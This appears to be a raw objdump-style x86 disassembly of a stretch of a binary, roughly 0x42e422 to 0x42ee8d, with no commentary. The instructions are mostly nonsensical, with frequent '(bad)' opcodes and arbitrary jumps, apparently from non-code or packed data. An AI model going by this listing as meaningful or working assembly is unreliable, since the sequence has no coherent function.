  42e422:	inc    ebp
  42e423:	int    0xab
  42e425:	mov    bl,0xf3
  42e427:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e428:	xor    bl,BYTE PTR [edx+0x7ed2f0bf]
  42e42e:	fidiv  WORD PTR [esi]
  42e430:	daa    
  42e431:	cmp    eax,0xfb0aea0
  42e436:	sbb    DWORD PTR [ecx+edi*4-0x7b9c9ea8],ebp
  42e43d:	pop    ss
  42e43e:	cmp    DWORD PTR [edx-0x28],eax
	...
  42e4b1:	add    BYTE PTR [eax],al
  42e4b3:	add    BYTE PTR [ecx-0x11ac7d0b],bl
  42e4b9:	ja     0x42e494
  42e4bb:	dec    DWORD PTR [edi]
  42e4bd:	jecxz  0x42e4a2
  42e4bf:	mov    esp,0x1681cd65
  42e4c4:	out    0xe8,eax
  42e4c6:	add    DWORD PTR [eax],eax
  42e4c8:	cmc    
  42e4c9:	add    BYTE PTR [eax],al
  42e4cb:	add    BYTE PTR [edx-0x1e966540],ah
  42e4d1:	jmp    0xa465db82
  42e4d6:	jmp    0xc464:0x15931ad5
  42e4dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e4de:	adc    BYTE PTR [ecx],ch
  42e4e0:	push   ebp
  42e4e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e4e2:	out    0xd,eax
  42e4e4:	xor    BYTE PTR [edi+0x64],0x7
  42e4e8:	les    ebp,FWORD PTR [ebp-0x648acd0d]
  42e4ee:	cmp    ecx,DWORD PTR [ebx-0x71c56539]
  42e4f4:	sub    DWORD PTR [ebx+0x6f7436b2],ebp
  42e4fa:	scas   eax,DWORD PTR es:[edi]
  42e4fb:	stos   BYTE PTR es:[edi],al
  42e4fc:	das    
  42e4fd:	aad    0x3d
  42e4ff:	and    al,0x6a
  42e501:	dec    ecx
  42e502:	jle    0x42e4c0
  42e504:	jnp    0x42e543
  42e506:	retf   0xfd08
  42e509:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e50a:	xor    eax,0x47a84f1a
  42e50f:	fsubr  st,st(5)
  42e511:	loop   0x42e534
  42e513:	les    ebx,FWORD PTR [bp+di]
  42e516:	in     al,dx
  42e517:	sbb    edi,esp
  42e519:	(bad)  
  42e51a:	fdivr  QWORD PTR [ebx-0x6]
  42e51d:	sub    dl,bl
  42e51f:	push   cs
  42e520:	push   ss
  42e521:	pop    DWORD PTR [ebx-0x44546098]
  42e527:	into   
  42e528:	push   edi
  42e529:	aam    0xa7
  42e52b:	stc    
  42e52c:	sbb    DWORD PTR [edx*2-0x48968744],0xffffffc0
  42e534:	or     BYTE PTR [eax],dh
  42e536:	pop    edx
  42e537:	or     BYTE PTR [ecx+0xff390cf],0x9a
  42e53e:	sbb    al,dh
  42e540:	mov    esp,DWORD PTR [esi+0x73]
  42e543:	adc    BYTE PTR [eax-0x3f9ae2a5],ah
  42e549:	repz sbb dl,BYTE PTR [edx+0x7b4cd305]
  42e550:	nop
  42e551:	retf   0x4421
  42e554:	(bad)  
  42e556:	std    
  42e557:	push   edi
  42e558:	push   ebx
  42e559:	xchg   ebp,eax
  42e55a:	aas    
  42e55b:	mov    edi,DWORD PTR [edi-0xf]
  42e55e:	test   DWORD PTR [edi],0x75fad526
  42e564:	xchg   ebp,eax
  42e565:	fdivr  QWORD PTR [eax-0x71a8c6d1]
  42e56b:	adc    eax,0xfbe2132b
  42e570:	and    al,0x2f
  42e572:	add    BYTE PTR [edi+0x575441f6],0xfd
  42e579:	call   0xbd5a6876
  42e57e:	ret    0x1c3f
  42e581:	add    al,0x56
  42e583:	jle    0x42e58f
  42e585:	cld    
  42e586:	jnp    0x42e553
  42e588:	xchg   DWORD PTR [esi-0x1ce11302],ebx
  42e58e:	icebp  
  42e58f:	pushf  
  42e590:	xchg   esp,eax
  42e591:	pop    ecx
  42e592:	scas   al,BYTE PTR es:[edi]
  42e593:	mov    eax,0x1873bbb0
  42e598:	pusha  
  42e599:	sbb    dh,ch
  42e59b:	mov    al,ds:0xd129db54
  42e5a0:	mov    ds:0x253b2bec,al
  42e5a5:	test   BYTE PTR [eax+0x68e0cc18],ch
  42e5ab:	mov    DWORD PTR [esi-0x25b780f],ebp
  42e5b1:	mov    esi,0x6a046221
  42e5b6:	shr    DWORD PTR ds:0x4e7a98a5,1
  42e5bc:	stc    
  42e5bd:	and    bh,BYTE PTR [ebx+0x1ecf]
	...
  42e633:	add    bl,dh
  42e635:	add    esp,DWORD PTR [eax]
  42e637:	(bad)  
  42e638:	lock scas eax,DWORD PTR es:[edi]
  42e63a:	(bad)  
  42e63b:	jg     0x42e5e4
  42e63d:	mov    WORD PTR [esi+0x5f],es
  42e640:	retf   
  42e641:	inc    edx
  42e642:	dec    ebp
  42e643:	add    bl,ah
  42e645:	jmp    0x137e64b
  42e64a:	add    BYTE PTR [eax],al
  42e64c:	jns    0x42e614
  42e64e:	adc    bl,cl
  42e650:	cmp    esi,DWORD PTR [ebp-0x6718ecce]
  42e656:	loope  0x42e66b
  42e658:	stc    
  42e659:	sbb    eax,0xb68c54f4
  42e65e:	and    ebp,DWORD PTR [edx+esi*8-0x202e0244]
  42e665:	sbb    bl,bh
  42e667:	sbb    dl,BYTE PTR [esi]
  42e669:	hlt    
  42e66a:	jne    0x42e67c
  42e66c:	xor    BYTE PTR [ebx+0x52c10fbf],dl
  42e672:	mov    ah,BYTE PTR [ebx-0x9]
  42e675:	mov    al,ds:0xa2dfbbfa
  42e67a:	repz out dx,eax
  42e67c:	cmp    esi,DWORD PTR [ebp-0x1aa32548]
  42e682:	add    eax,0x5bbe3e51
  42e687:	xor    esp,esi
  42e689:	xchg   edx,eax
  42e68a:	nop
  42e68b:	daa    
  42e68c:	jo     0x42e6c6
  42e68e:	sbb    dh,ah
  42e690:	jns    0x42e634
  42e692:	sub    al,0xb4
  42e694:	out    0xce,eax
  42e696:	jecxz  0x42e713
  42e698:	ds push 0x58288398
  42e69e:	jbe    0x42e628
  42e6a0:	ror    DWORD PTR [ebx+0x6a],0x76
  42e6a4:	repnz in eax,0xb
  42e6a7:	repz call 0xc88712b2
  42e6ad:	adc    edx,DWORD PTR [ebx]
  42e6af:	mov    edi,0xadba3d11
  42e6b4:	arpl   WORD PTR [edi+esi*4],bp
  42e6b7:	add    ecx,DWORD PTR [ecx]
  42e6b9:	arpl   bx,di
  42e6bb:	mov    ebp,0x4ecfc259
  42e6c0:	(bad)  
  42e6c1:	dec    edi
  42e6c2:	adc    DWORD PTR ss:[ebp+eiz*2+0x3b],ebx
  42e6c7:	and    BYTE PTR [ecx],ch
  42e6c9:	add    DWORD PTR [esi-0x65587d99],eax
  42e6cf:	jmp    0xef672f57
  42e6d4:	sbb    al,0x1c
  42e6d6:	pop    es
  42e6d7:	mov    ch,BYTE PTR [ecx+edi*1+0xd2a1c5b]
  42e6de:	mov    cl,0xb8
  42e6e0:	jecxz  0x42e75f
  42e6e2:	ja     0x42e763
  42e6e4:	xchg   ebp,eax
  42e6e5:	and    cl,BYTE PTR [ebx]
  42e6e7:	adc    al,0x5f
  42e6e9:	stos   DWORD PTR es:[edi],eax
  42e6ea:	pop    ebp
  42e6eb:	loop   0x42e671
  42e6ed:	pop    esi
  42e6ee:	shl    BYTE PTR [ecx+0x21],1
  42e6f1:	in     al,dx
  42e6f2:	(bad)  
  42e6f3:	xchg   esi,eax
  42e6f4:	mov    ebx,0x120eaaee
  42e6f9:	cmp    al,BYTE PTR [esi+0x3d1ee1a6]
  42e6ff:	and    eax,0xcb9a985b
  42e704:	jbe    0x42e6a4
  42e706:	dec    ecx
  42e707:	sbb    esi,DWORD PTR [esi+0x7b355c88]
  42e70d:	mov    edx,0x2985b5a1
  42e712:	mov    edx,0xbfd11d1b
  42e717:	scas   eax,DWORD PTR es:[edi]
  42e718:	mov    esi,0xe22c8e6
  42e71d:	and    BYTE PTR [ecx+0x6f078fc1],al
  42e723:	shr    BYTE PTR [esi+esi*1],cl
  42e726:	mov    ch,0x5f
  42e728:	mov    ah,0xbb
  42e72a:	push   0xc15ecc47
  42e72f:	(bad)  
  42e730:	mov    bl,0x19
  42e732:	dec    ebx
  42e733:	mov    esp,0xee3b1bd8
  42e738:	out    dx,al
  42e739:	in     eax,dx
  42e73a:	mov    bh,0x8c
  42e73c:	js     0x42e6fb
  42e73e:	test   al,0x6c
  42e740:	jo     0x42e742
	...
  42e7b2:	add    BYTE PTR [eax],al
  42e7b4:	xchg   esi,eax
  42e7b5:	fwait
  42e7b6:	cwde   
  42e7b7:	pop    edi
  42e7b8:	popf   
  42e7b9:	pop    edi
  42e7ba:	xlat   BYTE PTR ds:[ebx]
  42e7bb:	fisttp DWORD PTR [esi+0x590d5576]
  42e7c1:	cmc    
  42e7c2:	mov    cl,0x60
  42e7c4:	shr    edx,1
  42e7c6:	add    DWORD PTR [eax],eax
  42e7c8:	cmc    
  42e7c9:	add    BYTE PTR [eax],al
  42e7cb:	add    BYTE PTR ds:0xe3edd511,ah
  42e7d1:	test   ebx,0xd3edfcf1
  42e7d7:	push   0x3f5368a7
  42e7dc:	or     edi,ebx
  42e7de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e7df:	push   eax
  42e7e0:	pop    ebp
  42e7e1:	mov    ch,0xe7
  42e7e3:	cdq    
  42e7e4:	nop
  42e7e5:	mov    al,0x89
  42e7e7:	es out 0x75,al
  42e7ea:	sub    al,0x29
  42e7ec:	jb     0x42e774
  42e7ee:	iret   
  42e7ef:	or     DWORD PTR [ecx-0x3b],0x1ea4b4e9
  42e7f6:	jg     0x42e83e
  42e7f8:	call   0xcffdaa62
  42e7fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e7fe:	shl    bl,cl
  42e800:	fimul  DWORD PTR [ebx-0x4]
  42e803:	(bad)  
  42e804:	or     ch,BYTE PTR [eax-0x70]
  42e807:	or     al,0x82
  42e809:	mov    dh,0xdf
  42e80b:	fld    DWORD PTR [ecx+0x565c7558]
  42e811:	or     eax,0x49105013
  42e816:	or     cl,BYTE PTR [esi+0x43ed36e8]
  42e81c:	sub    cl,BYTE PTR [esi-0x4b]
  42e81f:	push   ss
  42e820:	icebp  
  42e821:	popa   
  42e822:	adc    ecx,DWORD PTR [edi]
  42e824:	retf   0x5165
  42e827:	mov    dl,0x3d
  42e829:	pop    edi
  42e82a:	inc    eax
  42e82b:	fnsave [edi-0x28e465d3]
  42e831:	addr16 jns 0x42e7f3
  42e834:	push   0x52
  42e836:	jae    0x42e7c7
  42e838:	ficom  WORD PTR [ebx]
  42e83a:	in     eax,0x88
  42e83c:	ja     0x42e7de
  42e83e:	scas   al,BYTE PTR es:[edi]
  42e83f:	outs   dx,DWORD PTR ds:[esi]
  42e840:	stos   DWORD PTR es:[edi],eax
  42e841:	fs lock loop 0x42e844
  42e845:	xor    esp,DWORD PTR [eax+0x31]
  42e848:	test   BYTE PTR [ebp-0x4d8f10b9],dh
  42e84e:	sbb    DWORD PTR [ebx],edi
  42e850:	sbb    BYTE PTR [ecx-0x43],bh
  42e853:	jns    0x42e8a5
  42e855:	inc    edx
  42e856:	fsubr  DWORD PTR [eax]
  42e858:	shr    ch,cl
  42e85a:	es push ds
  42e85c:	adc    bh,BYTE PTR [edx+ecx*8+0x79]
  42e860:	cs enter 0x96ee,0xcb
  42e865:	(bad)  
  42e866:	jmp    FWORD PTR [esi]
  42e868:	mov    esi,0x703de6f
  42e86d:	inc    eax
  42e86e:	dec    ecx
  42e86f:	aad    0xbc
  42e871:	je     0x42e7fa
  42e873:	xchg   esi,eax
  42e874:	(bad)  
  42e875:	jp     0x42e850
  42e877:	pop    ds
  42e878:	push   edi
  42e879:	cwde   
  42e87a:	outs   dx,BYTE PTR ds:[esi]
  42e87b:	jne    0x42e81e
  42e87d:	ja     0x42e839
  42e87f:	pusha  
  42e880:	jecxz  0x42e8f2
  42e882:	(bad)  
  42e884:	mov    dh,BYTE PTR [esi]
  42e886:	cmp    ebx,esp
  42e888:	adc    DWORD PTR [ecx+eiz*1],ebx
  42e88b:	mov    al,ds:0x80a263f4
  42e890:	mov    al,ds:0x485390ac
  42e895:	(bad)  
  42e896:	and    edi,DWORD PTR [ecx-0x47]
  42e899:	adc    al,0xe0
  42e89b:	gs jmp 0x97e2bc55
  42e8a1:	arpl   WORD PTR [edi-0x1c],si
  42e8a4:	mov    ebx,0x93be0e05
  42e8a9:	sub    DWORD PTR [esi],ebp
  42e8ab:	call   0x2aa4:0x17eceb28
  42e8b2:	inc    edi
  42e8b3:	xor    ah,bh
  42e8b5:	or     esi,DWORD PTR [esi+eax*1-0x67]
  42e8b9:	int    0x35
  42e8bb:	mov    ecx,0xe309587c
  42e8c0:	test   eax,0x0
	...
  42e931:	add    BYTE PTR [eax],al
  42e933:	add    cl,bh
  42e935:	mov    cl,0x70
  42e937:	dec    eax
  42e938:	js     0x42e903
  42e93a:	stc    
  42e93b:	mov    cl,0x3
  42e93d:	push   ds
  42e93e:	nop
  42e93f:	aad    0xac
  42e941:	cmp    BYTE PTR [ecx],ah
  42e943:	ret    0xebc6
  42e946:	add    DWORD PTR [eax],eax
  42e948:	cmc    
  42e949:	add    BYTE PTR [eax],al
  42e94b:	add    ch,al
  42e94d:	push   0xffffffcc
  42e94f:	add    bh,BYTE PTR [ecx+0x77]
  42e952:	ror    DWORD PTR [ecx],cl
  42e954:	ds shl dl,cl
  42e957:	jnp    0x42e96d
  42e959:	add    BYTE PTR [ebp+0x1286ae31],dh
  42e95f:	cmp    al,0xe0
  42e961:	das    
  42e962:	sbb    ebx,DWORD PTR [edx]
  42e964:	adc    al,0x34
  42e966:	dec    dh
  42e968:	xor    ah,BYTE PTR [edx-0xb]
  42e96b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e96c:	mov    edi,DWORD PTR [eax+0x23]
  42e96f:	imul   ebp
  42e971:	pop    es
  42e972:	sbb    dl,BYTE PTR ds:0x710a91d7
  42e978:	mov    ecx,0x4034a717
  42e97d:	jne    0x42e9e2
  42e97f:	outs   dx,DWORD PTR ds:[esi]
  42e980:	out    0xf0,eax
  42e982:	and    eax,0x9778e0db
  42e987:	retf   0xd086
  42e98a:	dec    ebp
  42e98b:	push   es
  42e98c:	into   
  42e98d:	xchg   edx,esi
  42e98f:	jmp    0x7f329043
  42e994:	enter  0xd8b,0xbc
  42e998:	imul   eax,eax,0xffffffbb
  42e99b:	retf   
  42e99c:	inc    esp
  42e99d:	sbb    BYTE PTR [eax+0x3940a91c],cl
  42e9a3:	sti    
  42e9a4:	and    DWORD PTR [ebx],eax
  42e9a6:	sub    ch,BYTE PTR [eax-0x49403028]
  42e9ac:	xlat   BYTE PTR ds:[ebx]
  42e9ad:	xor    eax,0x8641baf0
  42e9b2:	push   ecx
  42e9b3:	fcomp  DWORD PTR [eax]
  42e9b5:	jmp    0xbde65097
  42e9ba:	or     BYTE PTR [ebp-0xb9d0618],bl
  42e9c0:	jg     0x42ea28
  42e9c2:	scas   al,BYTE PTR es:[edi]
  42e9c3:	fidiv  DWORD PTR ds:0x82e2a5f1
  42e9c9:	mov    dh,0x84
  42e9cb:	add    BYTE PTR [edx+0x1d],al
  42e9ce:	jbe    0x42ea21
  42e9d0:	jmp    0x531c:0x2deb4f73
  42e9d7:	lods   al,BYTE PTR ds:[esi]
  42e9d8:	jl     0x42ea27
  42e9da:	sahf   
  42e9db:	mov    bh,BYTE PTR [ebx]
  42e9dd:	lea    edi,[esp-0x6c]
  42e9e1:	xchg   edi,eax
  42e9e2:	mov    esp,ebp
  42e9e4:	adc    esp,DWORD PTR [ebp+0x30dba2f1]
  42e9ea:	mov    al,0xb3
  42e9ec:	sahf   
  42e9ed:	sbb    ah,BYTE PTR [ecx+0x14]
  42e9f0:	mov    bh,ch
  42e9f2:	sub    BYTE PTR [edi],ch
  42e9f4:	adc    esi,DWORD PTR [edx+0x3ab49777]
  42e9fa:	sar    BYTE PTR [edi],0x54
  42e9fd:	pop    edx
  42e9fe:	inc    eax
  42e9ff:	test   BYTE PTR [esi+eax*4+0x166a4815],0xf7
  42ea07:	ja     0x42e9a7
  42ea09:	push   0xffffff96
  42ea0b:	outs   dx,BYTE PTR ds:[esi]
  42ea0c:	in     al,0x4b
  42ea0e:	imul   esi,DWORD PTR [edi+0x3629566b],0x6b
  42ea15:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ea16:	ja     0x42e9de
  42ea18:	in     eax,0x3c
  42ea1a:	mov    esi,eax
  42ea1c:	pop    edx
  42ea1d:	sti    
  42ea1e:	jns    0x42ea07
  42ea20:	pop    ecx
  42ea21:	pop    ss
  42ea22:	push   edx
  42ea23:	inc    eax
  42ea24:	sub    dh,BYTE PTR [eax-0x2a]
  42ea27:	sbb    ebx,DWORD PTR [ebp-0x262b798c]
  42ea2d:	outs   dx,DWORD PTR ds:[esi]
  42ea2e:	pop    ebx
  42ea2f:	ins    DWORD PTR es:[edi],dx
  42ea30:	je     0x42e9dc
  42ea32:	adc    bh,BYTE PTR [ebx-0x723842ce]
  42ea38:	in     eax,0xc8
  42ea3a:	test   DWORD PTR [ecx+0x5e],ebx
  42ea3d:	xor    eax,0x71d325
	...
  42eab2:	add    BYTE PTR [eax],al
  42eab4:	mov    al,0x7a
  42eab6:	pop    ds
  42eab7:	ins    BYTE PTR es:[edi],dx
  42eab8:	fild   QWORD PTR [ebp-0xd]
  42eabb:	dec    BYTE PTR [ebx]
  42eabd:	add    ah,BYTE PTR [ebp-0x48]
  42eac0:	ins    BYTE PTR es:[edi],dx
  42eac1:	and    edx,DWORD PTR [edx+0x1ecbb1f]
  42eac7:	add    ch,dh
  42eac9:	add    BYTE PTR [eax],al
  42eacb:	add    cl,ch
  42eacd:	repz (bad) 
  42eacf:	pop    edi
  42ead0:	dec    ecx
  42ead1:	push   eax
  42ead2:	jecxz  0x42eac0
  42ead4:	out    dx,eax
  42ead5:	lods   eax,DWORD PTR ds:[esi]
  42ead6:	cmp    esi,DWORD PTR [ebp+0x1a]
  42ead9:	mov    es,WORD PTR [edi+0x3b]
  42eadc:	pop    esi
  42eadd:	adc    dl,BYTE PTR ss:[ecx+0x3f]
  42eae1:	mov    dl,0x83
  42eae3:	push   esp
  42eae4:	dec    edx
  42eae5:	fwait
  42eae6:	lds    edx,FWORD PTR [ebp+edi*2-0x51]
  42eaea:	add    DWORD PTR [ebx-0x3ab16a3c],eax
  42eaf0:	jne    0x42eab8
  42eaf2:	inc    esp
  42eaf3:	mov    edx,0x4acd05b1
  42eaf8:	popa   
  42eaf9:	retf   
  42eafa:	retf   
  42eafb:	inc    edx
  42eafc:	cwde   
  42eafd:	mov    ?,WORD PTR [eax]
  42eaff:	popa   
  42eb00:	das    
  42eb01:	xlat   BYTE PTR ds:[ebx]
  42eb02:	inc    ebx
  42eb03:	push   esp
  42eb04:	enter  0x4f52,0x11
  42eb08:	and    BYTE PTR [esi],dl
  42eb0a:	(bad)  
  42eb0b:	jle    0x42ea98
  42eb0d:	stc    
  42eb0e:	arpl   WORD PTR [edi+0x5],dx
  42eb11:	mov    BYTE PTR [edi-0x4bf128bb],dl
  42eb17:	cld    
  42eb18:	outs   dx,BYTE PTR ds:[esi]
  42eb19:	mov    dl,0xe
  42eb1b:	add    bl,BYTE PTR [edx-0x382a6902]
  42eb21:	mov    dl,0x7e
  42eb23:	retf   0x31e
  42eb26:	(bad)  
  42eb27:	out    0xec,al
  42eb29:	loop   0x42eafb
  42eb2b:	pop    edx
  42eb2c:	loop   0x42eb0e
  42eb2e:	inc    esp
  42eb2f:	inc    esi
  42eb30:	xchg   ebp,eax
  42eb31:	dec    ebp
  42eb32:	inc    esp
  42eb33:	cmp    ecx,DWORD PTR [edx-0x5e]
  42eb36:	imul   ebx,DWORD PTR [ecx-0x14],0xc4380886
  42eb3d:	or     al,0xc
  42eb3f:	lahf   
  42eb40:	aam    0xf2
  42eb42:	leave  
  42eb43:	pop    ebp
  42eb44:	push   esi
  42eb45:	imul   esi,DWORD PTR [edi+0x9],0xffffffed
  42eb49:	dec    edi
  42eb4a:	fcmovu st,st(4)
  42eb4c:	(bad)  
  42eb4d:	call   0x8a68ae02
  42eb52:	inc    ebp
  42eb53:	ins    DWORD PTR es:[edi],dx
  42eb54:	iret   
  42eb55:	push   ss
  42eb56:	int    0x5e
  42eb58:	add    esi,DWORD PTR [edx-0x34f68d62]
  42eb5e:	and    eax,0x6c3cb6f1
  42eb63:	mov    ebp,0x7e0c67b7
  42eb68:	test   eax,0x33d03ac9
  42eb6d:	test   BYTE PTR [edx],0xbd
  42eb70:	adc    edx,DWORD PTR [esi+0x5ff65884]
  42eb76:	jge    0x42ebed
  42eb78:	sti    
  42eb79:	mov    ebp,0x1c773392
  42eb7e:	push   cs
  42eb7f:	repz das 
  42eb81:	push   0xa6d9e82d
  42eb86:	mov    al,ds:0xb96bc59f
  42eb8b:	xchg   esp,eax
  42eb8c:	test   cl,0xf1
  42eb8f:	(bad)  
  42eb90:	retf   
  42eb91:	lds    esp,FWORD PTR [edi-0x56]
  42eb94:	fwait
  42eb95:	pop    ebx
  42eb96:	pop    eax
  42eb97:	shr    bl,cl
  42eb99:	ret    0x7557
  42eb9c:	jg     0x42eb8b
  42eb9e:	and    eax,0xd646a258
  42eba3:	retf   
  42eba4:	out    dx,al
  42eba5:	mov    eax,ds:0xf06acf6f
  42ebaa:	out    0x16,al
  42ebac:	mov    WORD PTR [edi+0x2918b2b9],es
  42ebb2:	rol    bh,1
  42ebb4:	push   ecx
  42ebb5:	shr    esp,1
  42ebb7:	mov    esp,0x13c6a1ca
  42ebbc:	and    DWORD PTR [ecx+0x5b],edi
  42ebbf:	sub    eax,DWORD PTR [eax+eax*1]
	...
  42ec32:	add    BYTE PTR [eax],al
  42ec34:	cmp    DWORD PTR [edi-0x2010f093],esi
  42ec3a:	jnp    0x42ebf3
  42ec3c:	sbb    cl,BYTE PTR [edi+edx*4+0x11d24769]
  42ec43:	leave  
  42ec44:	mov    al,0xed
  42ec46:	add    DWORD PTR [eax],eax
  42ec48:	cmc    
  42ec49:	add    BYTE PTR [eax],al
  42ec4b:	add    BYTE PTR [eax+ebp*2-0x5dbf9331],ah
  42ec52:	jecxz  0x42ec7b
  42ec54:	push   cs
  42ec55:	rcl    BYTE PTR [edi],0xb4
  42ec58:	sti    
  42ec59:	int    0xe0
  42ec5b:	or     al,0x65
  42ec5d:	adc    eax,0x6e9b759c
  42ec62:	xor    ecx,ebx
  42ec64:	addr16 mov ebp,0xab71dda9
  42ec6a:	dec    ebp
  42ec6b:	pusha  
  42ec6c:	enter  0x8e0e,0x92
  42ec70:	mov    bl,0x2
  42ec72:	in     eax,0x41
  42ec74:	add    bl,al
  42ec76:	loopne 0x42ecc2
  42ec78:	pushf  
  42ec79:	retf   0xd883
  42ec7c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ec7d:	adc    BYTE PTR [edi+ebp*4],bh
  42ec80:	jp     0x42ec41
  42ec82:	inc    esp
  42ec83:	or     DWORD PTR [esi+0x708d8b34],eax
  42ec89:	int3   
  42ec8a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ec8b:	ja     0x42ec28
  42ec8d:	or     eax,0xb04c044a
  42ec92:	ds dec esp
  42ec94:	sti    
  42ec95:	push   ss
  42ec96:	ins    DWORD PTR es:[edi],dx
  42ec97:	pop    ss
  42ec98:	and    ecx,ebx
  42ec9a:	popf   
  42ec9b:	scas   eax,DWORD PTR es:[edi]
  42ec9c:	lahf   
  42ec9d:	add    bl,al
  42ec9f:	ins    BYTE PTR es:[edi],dx
  42eca0:	test   DWORD PTR [edx],0x77d0f8ac
  42eca6:	enter  0xedb1,0x8c
  42ecaa:	dec    ecx
  42ecab:	aaa    
  42ecac:	dec    ebx
  42ecad:	outs   dx,BYTE PTR ds:[esi]
  42ecae:	xchg   edi,eax
  42ecaf:	mov    ds:0xdb1fde81,al
  42ecb4:	mov    bh,0x46
  42ecb6:	cld    
  42ecb7:	sub    DWORD PTR [ebp+0xabe189f],esp
  42ecbd:	add    al,0x7f
  42ecbf:	or     al,0x8
  42ecc1:	adc    al,0x87
  42ecc3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ecc4:	fld    QWORD PTR [eax+eiz*4-0x26]
  42ecc8:	out    dx,al
  42ecc9:	pushf  
  42ecca:	call   edx
  42eccc:	mov    cl,ah
  42ecce:	cli    
  42eccf:	dec    edi
  42ecd0:	(bad)  
  42ecd1:	aad    0xea
  42ecd3:	push   cs
  42ecd4:	stc    
  42ecd5:	jle    0x42ed4a
  42ecd7:	pop    edi
  42ecd8:	fild   DWORD PTR [ebx+0x2a286820]
  42ecde:	jl     0x42ed1e
  42ece0:	dec    edx
  42ece1:	neg    DWORD PTR [ebx]
  42ece3:	or     DWORD PTR [ebp-0x30c09c3],esi
  42ece9:	mul    DWORD PTR [eax-0x62627a60]
  42ecef:	mov    WORD PTR [esi-0x27],ds
  42ecf2:	or     BYTE PTR [ebx-0x3a],dl
  42ecf5:	rol    BYTE PTR [ebx-0x34489520],1
  42ecfb:	cdq    
  42ecfc:	add    al,0x90
  42ecfe:	mov    bl,0xeb
  42ed00:	push   0x97dfff5
  42ed05:	mov    al,0x30
  42ed07:	xor    bl,BYTE PTR [edx-0x6c]
  42ed0a:	cdq    
  42ed0b:	inc    eax
  42ed0c:	dec    edx
  42ed0d:	or     eax,0xee5f1ff4
  42ed12:	ds in  al,dx
  42ed14:	test   DWORD PTR [ebp+0x4895472b],0x44328f7c
  42ed1e:	hlt    
  42ed1f:	inc    edx
  42ed20:	dec    ebx
  42ed21:	test   BYTE PTR [esi+0x6c],0x27
  42ed25:	jg     0x42ed55
  42ed27:	jnp    0x42eda3
  42ed29:	das    
  42ed2a:	test   DWORD PTR [edx+0x4be14ace],ebx
  42ed30:	test   al,0xca
  42ed32:	push   esi
  42ed33:	pushf  
  42ed34:	test   DWORD PTR [edx],ebp
  42ed36:	dec    ebx
  42ed37:	mov    esi,0x1f1c261e
  42ed3c:	mov    bl,0x62
  42ed3e:	test   al,0x18
  42ed40:	das    
	...
  42edb1:	add    BYTE PTR [eax],al
  42edb3:	add    dh,ah
  42edb5:	sub    BYTE PTR [ebp-0x1c012cd],0xd7
  42edbc:	jmp    0x42ed84
  42edbe:	popa   
  42edbf:	test   eax,0xcaeaf314
  42edc4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42edc5:	out    dx,al
  42edc6:	add    DWORD PTR [eax],eax
  42edc8:	cmc    
  42edc9:	add    BYTE PTR [eax],al
  42edcb:	add    BYTE PTR [edx+0x40],ah
  42edce:	jns    0x42ede8
  42edd0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42edd1:	outs   dx,DWORD PTR ds:[esi]
  42edd2:	mov    cl,0xf9
  42edd4:	jne    0x42ee4e
  42edd6:	mov    bl,0xee
  42edd8:	jae    0x42ee52
  42edda:	mov    eax,0x56dc8296
  42eddf:	inc    esp
  42ede0:	cmp    DWORD PTR [esi-0x4b694cc5],edx
  42ede6:	sbb    al,0x5e
  42ede8:	sbb    BYTE PTR [edx+0x57209118],ah
  42edee:	xchg   esp,eax
  42edef:	popa   
  42edf0:	jmp    0x67e193d
  42edf5:	mov    esi,0x5f963d2b
  42edfa:	mov    al,ds:0x6dbd512e
  42edff:	dec    edi
  42ee00:	jl     0x42ee3d
  42ee02:	sbb    BYTE PTR [esi+eax*2],dh
  42ee05:	xor    DWORD PTR [esi+0x523d2e3c],esi
  42ee0b:	xchg   edi,eax
  42ee0c:	or     al,0x3f
  42ee0e:	jae    0x42edd6
  42ee10:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ee11:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ee12:	mov    BYTE PTR [ebx],cl
  42ee14:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ee15:	push   es
  42ee16:	cdq    
  42ee17:	fld    TBYTE PTR [edi]
  42ee19:	mov    edx,0x800d0f57
  42ee1e:	xor    eax,0x6e5b38d6
  42ee23:	mov    ds:0x795f109f,al
  42ee28:	jno    0x42ee21
  42ee2a:	cld    
  42ee2b:	pop    edi
  42ee2c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ee2d:	gs sbb bh,dh
  42ee30:	cdq    
  42ee31:	scas   al,BYTE PTR es:[edi]
  42ee32:	cmp    edi,DWORD PTR [ebp+0x11a4262e]
  42ee38:	pop    esi
  42ee39:	mov    edx,0x6314ce0b
  42ee3e:	push   esp
  42ee3f:	popa   
  42ee40:	out    dx,al
  42ee41:	add    ch,BYTE PTR [ebp-0x4c]
  42ee44:	sub    eax,0x2fd9ba51
  42ee49:	push   ebx
  42ee4a:	sbb    DWORD PTR [ebx+0x47fd8eb7],edx
  42ee50:	ss mov cl,dl
  42ee53:	sub    BYTE PTR [ecx-0x3983a6b1],bl
  42ee59:	mov    ds:0x558cd10c,al
  42ee5e:	stc    
  42ee5f:	retf   0xa044
  42ee62:	(bad)  
  42ee63:	fbstp  TBYTE PTR [ecx+ebx*1-0x2e058185]
  42ee6a:	mov    dh,0x13
  42ee6c:	es mov edi,0x274a3eb6
  42ee72:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ee73:	push   esi
  42ee74:	push   0x980eca9a
  42ee79:	or     DWORD PTR [ecx],ebx
  42ee7b:	and    ebp,DWORD PTR [ebp+0x2dd0340f]
  42ee81:	and    al,dh
  42ee83:	mov    al,ds:0xd8289482
  42ee88:	rol    dh,cl
  42ee8a:	add    al,0x38
  42ee8c:	xlat   BYTE PTR ds:[ebx]
  42ee8d:	push   edi
